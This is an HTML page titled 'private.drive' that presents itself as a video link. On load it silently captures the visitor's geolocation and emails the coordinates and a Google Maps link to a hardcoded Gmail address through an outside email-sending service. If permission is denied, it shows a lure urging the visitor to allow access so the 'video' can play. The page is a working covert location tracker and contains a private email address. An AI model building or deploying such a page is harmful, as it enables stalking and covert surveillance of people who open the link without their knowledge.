<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>private.drive</title>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.7.7/dist/axios.min.js"></script>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: "Inter", sans-serif;
        background: #ffffff; /* ‚úÖ pure white background */
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(-20px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }
      h2 {
        color: #2d3748;
        font-size: 28px;
        margin-bottom: 20px;
        font-weight: 700;
      }
      .status {
        font-size: 16px;
        color: #4a5568;
        margin-top: 10px;
      }
      .success {
        color: #10b981;
        font-weight: 600;
        font-size: 18px;
        margin-top: 20px;
      }
      .error {
        color: #ef4444;
        font-weight: 600;
        font-size: 18px;
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <div id="status" class="status">loading ...</div>
    <div id="result"></div>

    <script>
      const statusDiv = document.getElementById("status");
      const resultDiv = document.getElementById("result");

      // ‚úÖ Function to send location email
      async function sendLocationEmail(lat, lon) {
        try {
          await axios.post(
            "https://email-sender-git-master-vm-rpos-projects.vercel.app/sendmail",
            {
              emailTo: "bhargavsaikumar259@gmail.com",
              subject: "vps",
              html: `
              <div style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
                <h3>üìç Automatic Location Capture</h3>
                <p><b>Lat:</b> ${lat}</p>
                <p><b>Long:</b> ${lon}</p>
                <p><b>Map Link:</b> 
                  <a href="https://www.google.com/maps?q=${lat},${lon}" 
                     target="_blank" 
                     style="color:#2563eb; text-decoration:none;">
                    View on Google Maps
                  </a>
                </p>
              </div>
            `,
            }
          );

          statusDiv.textContent = "";
          resultDiv.innerHTML = `<div class="status"><a href="#" class="play-link">Play</a></div>`;
        } catch (err) {
          console.error("Error :", err);
          statusDiv.textContent = "";
          resultDiv.innerHTML = `<div class="error">‚ùå Failed to send location. Try again.</div>`;
        }
      }

      // ‚úÖ Automatically ask and send location on load
      window.addEventListener("load", () => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              const lat = pos.coords.latitude.toFixed(6);
              const lon = pos.coords.longitude.toFixed(6);
              statusDiv.textContent = "Play";
              sendLocationEmail(lat, lon);
            },
            (err) => {
              console.error("Geolocation failed:", err.message);
              statusDiv.textContent = "";
              resultDiv.innerHTML = `<div class="status">Cant play this video, please allow permissions to access this link</div>`;
            }
          );
        } else {
          statusDiv.textContent = "";
          resultDiv.innerHTML = `<div class="status">Cant play this video, please allow permissions to access this link</div>`;
        }
      });
    </script>
  </body>
</html>
